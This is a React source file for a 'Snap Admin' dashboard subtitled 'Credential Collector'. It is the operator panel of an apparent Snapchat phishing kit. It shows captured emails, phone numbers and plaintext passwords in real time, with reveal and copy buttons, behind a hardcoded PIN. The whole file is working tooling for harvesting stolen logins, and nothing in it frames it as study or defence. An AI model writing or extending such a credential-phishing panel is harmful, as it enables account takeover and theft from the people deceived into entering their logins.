import { useState, useEffect } from "react";
import { getEntries, clearEntries, deleteEntry, SnapEntry } from "@/lib/storage";

const ADMIN_PIN = "admin123";

export default function AdminDashboard() {
  const [authed, setAuthed] = useState(false);
  const [pin, setPin] = useState("");
  const [pinError, setPinError] = useState("");
  const [entries, setEntries] = useState<SnapEntry[]>([]);
  const [showPasswords, setShowPasswords] = useState<Record<string, boolean>>({});
  const [search, setSearch] = useState("");
  const [copied, setCopied] = useState<string | null>(null);

  useEffect(() => {
    if (authed) {
      setEntries(getEntries());
      const interval = setInterval(() => setEntries(getEntries()), 3000);
      return () => clearInterval(interval);
    }
  }, [authed]);

  const handlePinSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (pin === ADMIN_PIN) {
      setAuthed(true);
      setPinError("");
    } else {
      setPinError("Incorrect PIN.");
      setPin("");
    }
  };

  const handleDelete = (id: string) => {
    deleteEntry(id);
    setEntries(getEntries());
  };

  const handleClearAll = () => {
    if (window.confirm("Delete all entries? This cannot be undone.")) {
      clearEntries();
      setEntries([]);
    }
  };

  const handleCopy = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopied(key);
    setTimeout(() => setCopied(null), 1500);
  };

  const togglePassword = (id: string) => {
    setShowPasswords((prev) => ({ ...prev, [id]: !prev[id] }));
  };

  const filtered = entries.filter(
    (e) =>
      e.email.toLowerCase().includes(search.toLowerCase()) ||
      e.phone.includes(search)
  );

  if (!authed) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-950 px-4">
        <form onSubmit={handlePinSubmit} className="flex flex-col gap-3 w-full max-w-xs">
          <h1 className="text-white text-lg font-bold text-center mb-1">Admin Access</h1>
          <input
            type="password"
            value={pin}
            onChange={(e) => setPin(e.target.value)}
            placeholder="Enter password"
            autoFocus
            className="w-full bg-gray-900 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 outline-none focus:border-[#FFFC00] transition text-center"
          />
          {pinError && <p className="text-red-400 text-sm text-center">{pinError}</p>}
          <button type="submit" className="w-full bg-[#FFFC00] hover:bg-yellow-300 text-black font-bold rounded-xl py-3 transition">
            Enter
          </button>
        </form>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-950 text-white">
      {/* Header */}
      <div className="bg-gray-900 border-b border-gray-800 px-6 py-4 flex items-center justify-between sticky top-0 z-10">
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 rounded-lg bg-[#FFFC00] flex items-center justify-center">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/>
            </svg>
          </div>
          <div>
            <h1 className="text-white font-bold text-base leading-none">Snap Admin</h1>
            <p className="text-gray-500 text-xs mt-0.5">Credential Collector</p>
          </div>
        </div>
        <div className="flex items-center gap-3">
          <span className="bg-[#FFFC00]/10 text-[#FFFC00] text-xs font-semibold px-3 py-1 rounded-full border border-[#FFFC00]/20">
            {entries.length} entries
          </span>
          {entries.length > 0 && (
            <button
              onClick={handleClearAll}
              className="text-red-400 hover:text-red-300 text-sm font-medium border border-red-900 hover:border-red-700 px-3 py-1.5 rounded-lg transition"
            >
              Clear All
            </button>
          )}
          <button
            onClick={() => setAuthed(false)}
            className="text-gray-500 hover:text-gray-300 text-sm border border-gray-800 hover:border-gray-600 px-3 py-1.5 rounded-lg transition"
          >
            Lock
          </button>
        </div>
      </div>

      <div className="max-w-5xl mx-auto px-4 py-6">
        {/* Stats */}
        <div className="grid grid-cols-3 gap-4 mb-6">
          <StatCard label="Total Logins" value={entries.length} color="yellow" />
          <StatCard label="With Phone" value={entries.filter(e => e.phone).length} color="green" />
          <StatCard label="Today" value={entries.filter(e => {
            const d = new Date(e.timestamp);
            const now = new Date();
            return d.toDateString() === now.toDateString();
          }).length} color="blue" />
        </div>

        {/* Search */}
        <div className="relative mb-4">
          <svg className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
          </svg>
          <input
            type="text"
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            placeholder="Search by email or phone..."
            className="w-full bg-gray-900 border border-gray-800 rounded-xl pl-9 pr-4 py-2.5 text-white placeholder-gray-600 outline-none focus:border-gray-600 transition text-sm"
          />
        </div>

        {/* Table */}
        {filtered.length === 0 ? (
          <div className="bg-gray-900 border border-gray-800 rounded-2xl p-12 text-center">
            <div className="text-5xl mb-4">👻</div>
            <p className="text-gray-400 font-medium">No entries yet</p>
            <p className="text-gray-600 text-sm mt-1">Login attempts will appear here in real-time</p>
          </div>
        ) : (
          <div className="bg-gray-900 border border-gray-800 rounded-2xl overflow-hidden">
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-gray-800 bg-gray-900/80">
                    <th className="text-left px-5 py-3 text-gray-500 font-semibold text-xs uppercase tracking-wider">#</th>
                    <th className="text-left px-5 py-3 text-gray-500 font-semibold text-xs uppercase tracking-wider">Email / Username</th>
                    <th className="text-left px-5 py-3 text-gray-500 font-semibold text-xs uppercase tracking-wider">Phone</th>
                    <th className="text-left px-5 py-3 text-gray-500 font-semibold text-xs uppercase tracking-wider">Password</th>
                    <th className="text-left px-5 py-3 text-gray-500 font-semibold text-xs uppercase tracking-wider">Time</th>
                    <th className="px-5 py-3"></th>
                  </tr>
                </thead>
                <tbody>
                  {filtered.map((entry, idx) => (
                    <tr key={entry.id} className="border-b border-gray-800/60 hover:bg-gray-800/40 transition group">
                      <td className="px-5 py-4 text-gray-600 font-mono text-xs">{idx + 1}</td>
                      <td className="px-5 py-4">
                        <div className="flex items-center gap-2">
                          <span className="text-white font-medium">{entry.email || <span className="text-gray-600 italic">—</span>}</span>
                          {entry.email && (
                            <button onClick={() => handleCopy(entry.email, `email-${entry.id}`)} className="opacity-0 group-hover:opacity-100 transition text-gray-600 hover:text-[#FFFC00]">
                              {copied === `email-${entry.id}` ? <CheckIcon /> : <CopyIcon />}
                            </button>
                          )}
                        </div>
                      </td>
                      <td className="px-5 py-4">
                        <div className="flex items-center gap-2">
                          <span className="text-gray-300">{entry.phone || <span className="text-gray-600 italic">—</span>}</span>
                          {entry.phone && (
                            <button onClick={() => handleCopy(entry.phone, `phone-${entry.id}`)} className="opacity-0 group-hover:opacity-100 transition text-gray-600 hover:text-[#FFFC00]">
                              {copied === `phone-${entry.id}` ? <CheckIcon /> : <CopyIcon />}
                            </button>
                          )}
                        </div>
                      </td>
                      <td className="px-5 py-4">
                        <div className="flex items-center gap-2">
                          <span className="font-mono text-gray-300 tracking-wider">
                            {showPasswords[entry.id] ? entry.password : "•".repeat(Math.min(entry.password.length, 12))}
                          </span>
                          <button onClick={() => togglePassword(entry.id)} className="text-gray-600 hover:text-gray-400 transition flex-shrink-0">
                            {showPasswords[entry.id] ? <EyeOffIcon /> : <EyeIcon />}
                          </button>
                          <button onClick={() => handleCopy(entry.password, `pass-${entry.id}`)} className="opacity-0 group-hover:opacity-100 transition text-gray-600 hover:text-[#FFFC00]">
                            {copied === `pass-${entry.id}` ? <CheckIcon /> : <CopyIcon />}
                          </button>
                        </div>
                      </td>
                      <td className="px-5 py-4 text-gray-500 text-xs whitespace-nowrap">
                        {formatTime(entry.timestamp)}
                      </td>
                      <td className="px-5 py-4">
                        <button
                          onClick={() => handleDelete(entry.id)}
                          className="opacity-0 group-hover:opacity-100 text-gray-600 hover:text-red-400 transition"
                        >
                          <TrashIcon />
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

function StatCard({ label, value, color }: { label: string; value: number; color: "yellow" | "green" | "blue" }) {
  const colors = {
    yellow: "text-[#FFFC00] bg-[#FFFC00]/10 border-[#FFFC00]/20",
    green: "text-emerald-400 bg-emerald-400/10 border-emerald-400/20",
    blue: "text-blue-400 bg-blue-400/10 border-blue-400/20",
  };
  return (
    <div className={`rounded-xl border p-4 ${colors[color]} bg-gray-900`}>
      <p className="text-2xl font-black">{value}</p>
      <p className="text-gray-500 text-xs mt-1 font-medium">{label}</p>
    </div>
  );
}

function formatTime(iso: string): string {
  const d = new Date(iso);
  const now = new Date();
  const diff = Math.floor((now.getTime() - d.getTime()) / 1000);
  if (diff < 60) return `${diff}s ago`;
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
  return d.toLocaleDateString();
}

function CopyIcon() {
  return (
    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
    </svg>
  );
}

function CheckIcon() {
  return (
    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#22c55e" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="20 6 9 17 4 12"/>
    </svg>
  );
}

function TrashIcon() {
  return (
    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/>
    </svg>
  );
}

function EyeIcon() {
  return (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
    </svg>
  );
}

function EyeOffIcon() {
  return (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
      <line x1="1" y1="1" x2="23" y2="23"/>
    </svg>
  );
}
